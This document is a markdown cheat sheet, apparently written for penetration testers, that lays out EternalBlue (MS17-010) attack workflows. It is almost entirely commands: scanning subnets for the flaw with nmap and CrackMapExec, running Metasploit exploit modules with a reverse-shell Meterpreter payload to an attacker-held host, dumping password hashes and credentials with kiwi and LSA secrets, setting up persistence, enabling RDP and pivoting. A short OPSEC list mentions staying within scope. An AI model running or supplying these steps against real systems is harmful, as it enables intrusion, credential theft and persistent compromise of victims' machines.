# EternalBlue Exploitation Workflows

## Workflow 1: Vulnerability Detection

### Nmap NSE Scripts
```bash
# Check for MS17-010 vulnerability
nmap -p 445 --script smb-vuln-ms17-010 10.0.0.0/24

# Extended SMB vulnerability scan
nmap -p 445 --script smb-vuln-* 10.0.0.1

# SMB version detection
nmap -p 445 --script smb-protocols 10.0.0.1
```

### CrackMapExec
```bash
# Mass scan for MS17-010
crackmapexec smb 10.0.0.0/24 -M ms17-010

# Check with authentication
crackmapexec smb 10.0.0.0/24 -u user -p password -M ms17-010
```

### Metasploit Auxiliary Scanner
```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.0.0.0/24
set THREADS 10
run
```

## Workflow 2: Exploitation with Metasploit

### EternalBlue Module
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.100
set LPORT 443
exploit

# Post-exploitation
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

### EternalRomance/Synergy (PsExec variant)
```
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.0.0.1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.100
set SMBUser ""
set SMBPass ""
exploit
```

## Workflow 3: Post-Exploitation

### Credential Dumping
```
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kerberos_ticket_list
meterpreter > lsa_dump_secrets
```

### Persistence
```
meterpreter > run persistence -U -i 30 -p 4444 -r 10.0.0.100
meterpreter > run post/windows/manage/enable_rdp
```

### Pivoting
```
meterpreter > run post/multi/manage/autoroute
meterpreter > portfwd add -l 445 -p 445 -r 10.0.1.1
```

## OPSEC Considerations

1. EternalBlue exploitation is noisy and easily detected by IDS/IPS
2. Modern EDR solutions detect named pipe and service creation patterns
3. Exploitation may crash the target system (especially on 32-bit systems)
4. Use only against confirmed vulnerable systems within ROE scope
5. Prefer authenticated exploitation variants when credentials are available
6. Document any system crashes or instability immediately
